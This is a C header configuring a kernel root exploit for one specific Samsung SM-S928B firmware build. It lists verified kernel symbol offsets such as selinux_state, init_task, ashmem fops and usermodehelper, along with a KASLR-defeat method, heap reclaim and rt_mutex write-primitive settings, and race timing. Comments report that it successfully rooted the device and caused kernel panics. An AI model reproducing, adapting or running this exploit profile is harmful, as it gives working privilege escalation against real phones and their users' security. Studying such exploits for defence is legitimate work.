/*
 * SM-S928B / S928BXXU6EZIF port.
 *
 * Identity fields are measured on the reference SM-S928B unit.
 * Every symbol offset below is checked against the Image shipped in
 * S928BXXU6EZIF (38,140,416 bytes, sha256 a8c1638497ca1bff576c5a6d9426521e
 * c545fd68da8ce5dfa47c40233391a179): each entry resolves to its kallsyms
 * symbol at base+offset, or to an object whose contents point at the
 * documented target.  p0_fingerprint.h is generated from the same Image at
 * P0_ORACLE_PROBE_OFFSET.  SLIDE_PSELECT_WORD_SHIFT comes from this Image's
 * futex/pselect frames (see ezif_layout.h).
 *
 * P0_KERNEL_PHYS_LOAD is declared by the BL package this Image ships in: its
 * XBL memory map gives a 256 MiB region labelled "Kernel" at 0xa8000000; the
 * map's NOMAP region ends at the live memstart and UEFI_RESV ends at that base.
 * The same package's uefi.elf carries the driver that resolves that entry by
 * MemLabel and publishes its MemBase/MemSize as the KernelBaseAddr/KernelSize
 * variables LinuxLoader consumes (evidence/xbl-memorymap.md).  That is a
 * boot-chain declaration, not a reading from a running boot: /proc/iomem and
 * /proc/cmdline are denied to the shell, and the address travels through UEFI
 * variables, not a code literal.
 *
 * The offline gate in docs/PORT-STATUS.md must pass before this profile is
 * built or run. The build is hard-blocked below until then.
 */
#include "ezif_layout.h"

#if !defined(ALLOW_UNVERIFIED_S928B)
#error "e3q-S928BXXU6EZIF: P0_KERNEL_PHYS_LOAD is unproven on this build. See docs/PORT-STATUS.md."
#endif

/* Fail closed before any exploit attempt if the live phone differs.
 * Every value below was read from the reference SM-S928B unit. */
#define TARGET_GUARD_MODEL "SM-S928B"
#define TARGET_GUARD_DEVICE "e3q"
#define TARGET_GUARD_BUILD "CP2A.260605.016.S928BXXU6EZIF"
#define TARGET_GUARD_FINGERPRINT \
  "samsung/e3qxins/e3q:17/CP2A.260605.016/S928BXXU6EZIF:user/release-keys"
#define TARGET_GUARD_KERNEL \
  "6.1.162-android14-11-34343818-abS928BXXU6EZIF"
#define TARGET_GUARD_PATCH "2026-09-05"
#define TARGET_GUARD_ATTEMPT_LIMIT 24
#define APP_REQUIRE_FRESH_P0_SESSION 0
/* Prefer the exact tracefs caller when accessible, but the app SELinux domain
 * cannot read that event on the live phone.  Fall back to the physical P0
 * scan using the exact EZIF ABL/DTB-derived load address and fingerprint. */
#define APP_EZIF_TRACEFS_ONLY 0
#define APP_S928_ROUTE_DIAG 1
/* The pselect fdsets are backed by an unarmed timerfd. A timeout is not
 * evidence that the PI write failed; let the existing FOPS readback decide. */
#define APP_EZIF_VERIFY_PSELECT_TIMEOUT 1
#define APP_EZIF_ASHMEM_DIAG 1
#define APP_EZIF_PREPARE_TRACE 1
#define APP_EZIF_RECLAIM_TRACE 1
/* Validate that the reclaimed pipe page aliases the requested kernel-data
 * page before attempting the production misc_fops overwrite.  Keep the
 * verified page held and reuse it so the diagnostic and production paths do
 * not operate on different reclaim outcomes. */
#define APP_FOPS_DATA_ALIAS_DIAG_ONLY 0
#define APP_FOPS_DATA_ALIAS_GATE_VERIFY 0
#define APP_FOPS_REUSE_VERIFIED_PAGE 0
/* Deferring the readback past slot 4 means the pre-write value is never read,
 * so an `observed=0` result cannot distinguish a failed write from a page this
 * path cannot read at all.  Read before the production write: `expected` is
 * text_addr(ASHMEM_FOPS), so a pre-write mismatch proves the readback path -
 * not the rb_erase write - is what fails on a kernel-image .data page. */
#define APP_FOPS_DEFER_ALIAS_READBACK 0
#define APP_FOPS_DURABLE_POSTWRITE_LOG 1
/* EZIF's boot chain declares a fixed physical load for the image in its XBL
 * memory map. KASLR relocates only the canonical virtual mapping. */
#define APP_EZIF_FIXED_PHYS_DATA_ALIAS 0
/* Shizuku exposes the exact tracefs caller, so physical P0 is needed only to
 * prove a live reclaim in this process.  Do not place a kernel-image linear
 * alias in the slide payload: EZIF removes that alias from the linear map and
 * rt_mutex will fault if an incidental PI walk reaches the bank entry. */
#define APP_EZIF_TRACEFS_P0_GATE_ONLY 0
/* The exact rb_erase disassembly confirms that pi_parent is written through
 * pi_left.  Replicate the gate marker once per 4K inside the reclaimed
 * order-3 skb area so the gate remains identifiable when the fragment data
 * origin differs by a page from the inherited S928 layout. */
#define APP_EZIF_P0_CANARY_GRID 1
#define APP_EZIF_P0_CANARY_OFF 0x300
#define APP_EZIF_PIPE_SIZE_TRACE 1
/* Shell SELinux can read the scheduler event used for the slide, but cannot
 * write kmem trace-event controls.  Use a complete, address-identified
 * mm_struct slab group instead of the probabilistic legacy reclaim. */
#define APP_RECLAIM_TRACEFS_GATE 0
#define APP_CONTROLLED_MM_GROUP_RECLAIM 0
#define S918_PAGE_SCAN_MAX 256
#define S918_KSNITCH_HINT_COLLISIONS 2
#define S918_KSNITCH_FULL_COLLISIONS 5
/* Match the controlled-reclaim reference targets and tolerate transient
 * scheduler noise in the cheap one-collision page-hint measurement. */
#define KERNELSNITCH_BASELINE_SAMPLES 8
#define KERNELSNITCH_BASELINE_QUANTILE 1
#define KERNELSNITCH_THRESHOLD_MULT 8
#define KERNELSNITCH_COLLISION_CONFIRMATIONS 2
#define APP_CONTROLLED_HINT_COLLISION_RETRIES 3
#define S918_DMA32_SKIP_SLABS 8
#define S918_TRIGGER_SLABS 24
#define S918_SKB_SENDS 256
#define S918_SKB_SNDBUF 8388608
#define S918_RECLAIM_SOCKET_PAIRS 32
#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
#define MM_DMA32_ALIAS_END 0xffffff8080000000ULL
#define MM_NORMAL_ALIAS_START MM_DMA32_ALIAS_END
#define MM_NORMAL_ALIAS_END KERNELSNITCH_IDENTITY_END
/* The S938N port that actually rooted records why the shared default is wrong
 * here: its log shows three more attempts on one boot after the writer ran -
 * two reaching the physrw page, the third matching it and rooting - because the
 * pipe page is a lottery the kernel wins about one time in three.  The default
 * refusal spends the whole boot on that first draw.  Every run of ours so far
 * has ended on "stack writer ran; refusing retry on this boot" after a single
 * attempt, so attempts=24 has in practice meant attempts=1. */
#define APP_P0_RETRY_AFTER_WRITER 1
#define APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE 1
#define APP_PRODUCTION_SLOT_PI_RIGHT 0
#define APP_PRODUCTION_SLOT_PROVEN_LEFT 1
#define APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY 1
#define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
#define APP_FOPS_FRESH_PAGE_ATTEMPTS 1
#define APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES 1
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 1
#define APP_FOPS_MIN_OBJECT_INDEX 0
#define APP_FOPS_PSELECT_DELAY_USEC 50000
/* Unused in this tree, and it must stay that way: an absolute 0x2180 copy of
 * the 0x110-byte table would end at 0x2290 and overwrite the fake rt_mutex at
 * 0x2210.  Kept only because the source profile defines it. */
#define APP_EZIF_FOPS_TABLE_ALT_OFF 0x2180

/* Waiter field offsets are confirmed by this Image's BTF (rt_mutex_waiter is
 * 0x58 bytes with tree_entry at 0x0, pi_tree_entry at 0x18, task at 0x30, lock
 * at 0x38, wake_state at 0x40, prio at 0x44, deadline at 0x48, ww_ctx at 0x50)
 * and by the RB_CLEAR_NODE self-stores in futex_wait_requeue_pi.  The
 * task_struct fields are confirmed in the same BTF. */
#define SLIDE_SYNC_PSELECT_SYSCALL 0
#define SLIDE_GUARD_PSELECT_SYSCALL 0
#define SLIDE_PSELECT_READY_TIMEOUT_USEC 20000
#define SLIDE_PSELECT_RECHECK_TIMEOUT_USEC 20000
#define SLIDE_PSELECT_WCHAN_CONFIRMATIONS 3
#define APP_PSELECT_POST_GUARD_AGE_CHECK 0
#define APP_PSELECT_TRIGGER_MAX_AGE_USEC 70000
#define APP_PSELECT_FINAL_STATE_CHECK 0
/* The 70 ms route delay reached the 70 ms age guard at 74.14 ms.
 * Bound the EZIF candidate to 50 ms, retaining 20 ms guard headroom. */
/* Pinning this made slide_app.c ignore the supervisor's per-attempt value
 * entirely (it is the first branch of the chain).  Drop it and take the
 * PSELECT_DELAY_USEC branch so each attempt races at its own delay. */
/* A failed verify leaves misc_fops pointing at this attempt's fake fops page.
 * The page dies with the process, so the next /dev/ashmem open anywhere on the
 * phone follows a dangling pointer and panics - that is what killed boots all
 * day, with Google Play Services as the usual victim.  configfs_write_once()
 * cannot undo it (it travels through the very table that is broken), so craft a
 * second bank slot whose baked-in value is the original ashmem_fops and fire the
 * same rb_erase write to put it back. */
#define APP_FOPS_RESTORE_SLOT 1
#define APP_FOPS_ROUTE_USE_PSELECT_DELAY 1
#define APP_EZIF_FOPS_MAX_DELAY_USEC 50000
#if APP_EZIF_FOPS_MAX_DELAY_USEC >= APP_PSELECT_TRIGGER_MAX_AGE_USEC
#error "EZIF FOPS delay must stay below the pselect age limit"
#endif

/* A Shizuku shell can read tracefs, but a tracefs-only early return skips
 * current-process P0 discovery and is rejected by the fresh-session guard.
 * Retain the tracefs value as a hint and continue through physical P0. */
#undef APP_TRACEFS_KASLR_DIRECT
/* Keep this at 1: it also sets data_addr_canonical (slide_app.c), so the FOPS
 * write goes to the canonical kernel-image address.  v0.0.30 rooted this phone
 * that way - uid=2000->0 on attempt 5/24 - so the canonical write does land
 * here and the alias variant must not be re-enabled on a hunch. */
#define APP_TRACEFS_KASLR_DIRECT 1

#undef BUILD_VARIANT_LABEL
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "e3q-S928BXXU6EZIF-payload-v0.1-unverified"
#else
#define BUILD_VARIANT_LABEL "e3q-S928BXXU6EZIF-root-umh"
#endif

#undef P0_FINGERPRINT_HEADER
#define P0_FINGERPRINT_HEADER "targets/e3q-S928BXXU6EZIF/p0_fingerprint.h"

/* Verified on the SM-S928B reference unit without root. The live
 * sched_blocked_reason text trace reports caller=worker_thread+0xa0/0x430; the
 * raw ring buffer gives 0xffffffc0081cb39c for that event, and
 * 0xdb39c + 0xf0000 slide lands exactly on it (64 KiB aligned).
 * Image side: worker_thread (0xdb2fc) + 0x9c is `bl schedule`, so 0xdb39c is
 * that call's return address and the offset names the same frame. */
#undef SLIDE_TRACEFS_WORKER_CALLER_OFF
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db39cULL

#undef SLIDE_S928_PROBE_TARGET_IMAGE_OFF
#define SLIDE_S928_PROBE_TARGET_IMAGE_OFF 0x023dc200ULL

/* ---- symbol offsets checked against the S928BXXU6EZIF Image ----
 * Each value is either a kallsyms entry at base+offset or the address of an
 * object whose contents resolve to the documented target.  docs/DELTA.md
 * records the per-row evidence.  Recheck after any firmware change: a shared
 * KMI build id does not imply an identical layout. */
#undef ASHMEM_MISC_FOPS_OFF
/* ashmem_miscs (base+0x023dc1f0) + 0x10, the miscdevice .fops field; it holds
 * base+0x013e2e30. */
#define ASHMEM_MISC_FOPS_OFF 0x023dc200ULL
#undef ASHMEM_FOPS_OFF
#define ASHMEM_FOPS_OFF 0x013e2e30ULL
#undef ASHMEM_IOCTL_OFF
#define ASHMEM_IOCTL_OFF 0x00d44e8cULL
#undef ASHMEM_COMPAT_IOCTL_OFF
#define ASHMEM_COMPAT_IOCTL_OFF 0x00d457c4ULL
#undef ASHMEM_MMAP_OFF
#define ASHMEM_MMAP_OFF 0x00d4581cULL
#undef ASHMEM_OPEN_OFF
#define ASHMEM_OPEN_OFF 0x00d45a48ULL
#undef ASHMEM_RELEASE_OFF
#define ASHMEM_RELEASE_OFF 0x00d45ad0ULL
#undef ASHMEM_SHOW_FDINFO_OFF
#define ASHMEM_SHOW_FDINFO_OFF 0x00d45bf0ULL
#undef CONFIGFS_READ_ITER_OFF
#define CONFIGFS_READ_ITER_OFF 0x00472b84ULL
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x004730b4ULL
#undef COPY_SPLICE_READ_OFF
/* generic_file_splice_read; the macro name is inherited from the reference. */
#define COPY_SPLICE_READ_OFF 0x003f07c4ULL
#undef NOOP_LLSEEK_OFF
#define NOOP_LLSEEK_OFF 0x003a235cULL
#undef INIT_TASK_OFF
#define INIT_TASK_OFF 0x0226f6c0ULL
#undef ROOT_TASK_GROUP_OFF
#define ROOT_TASK_GROUP_OFF 0x0246dd80ULL
#undef SELINUX_ENFORCING_OFF
/* selinux_state, in .bss; the enforcing byte is its first field. */
#define SELINUX_ENFORCING_OFF 0x02542618ULL
#undef KMALLOC_CACHES_OFF
#define KMALLOC_CACHES_OFF 0x01781458ULL
#undef ANON_PIPE_BUF_OPS_OFF
#define ANON_PIPE_BUF_OPS_OFF 0x0122ad50ULL

#undef CALL_USERMODEHELPER_EXEC_WORK_OFF
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d3be0ULL
#undef SYSTEM_UNBOUND_WQ_OFF
#define SYSTEM_UNBOUND_WQ_OFF 0x0225ac60ULL

#undef SLIDE_NFULNL_LOGGER_OFF
/* nfulnl_logger.name holds base+0x16ba45d, where "nfnetlink_log" starts.  The
 * inherited 0x16ba44f pointed into the preceding "packet message\n" string, so
 * slide_read_stext returned real_stext+14 and every slide failed the 32 KiB
 * alignment check. */
#define SLIDE_NFULNL_LOGGER_OFF 0x016ba45dULL
#undef SLIDE_LOGGERS_0_1_OFF
/* nfulnl_logger itself. */
#define SLIDE_LOGGERS_0_1_OFF 0x02262828ULL
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
/* random_table[0x108].data, holding base+0x02625768 (&sysctl_bootid). */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02396a98ULL
#undef SLIDE_SYSCTL_BOOTID_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02625768ULL

/* Aliases for the symbol offsets above. */
#undef ASHMEM_MISC_FOPS
#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#undef ASHMEM_FOPS
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#undef ASHMEM_IOCTL
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#undef ASHMEM_COMPAT_IOCTL
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#undef ASHMEM_MMAP
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#undef ASHMEM_OPEN
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#undef ASHMEM_RELEASE
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#undef ASHMEM_SHOW_FDINFO
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#undef CONFIGFS_READ_ITER
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#undef CONFIGFS_BIN_WRITE_ITER
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#undef COPY_SPLICE_READ
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#undef NOOP_LLSEEK
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#undef INIT_TASK
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#undef ROOT_TASK_GROUP
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#undef SELINUX_ENFORCING
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#undef KMALLOC_CACHES
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#undef ANON_PIPE_BUF_OPS
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#undef CALL_USERMODEHELPER_EXEC_WORK
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#undef SYSTEM_UNBOUND_WQ
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#undef SLIDE_NFULNL_LOGGER_IMAGE
#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#undef SLIDE_LOGGERS_0_1_IMAGE
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#undef SLIDE_RANDOM_BOOT_ID_DATA_IMAGE
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#undef SLIDE_SYSCTL_BOOTID_IMAGE
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
#define SLIDE_NFULNL_LOGGER_NAME_IMAGE SLIDE_NFULNL_LOGGER_IMAGE
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE SLIDE_LOGGERS_0_1_IMAGE
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  SLIDE_RANDOM_BOOT_ID_DATA_IMAGE
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
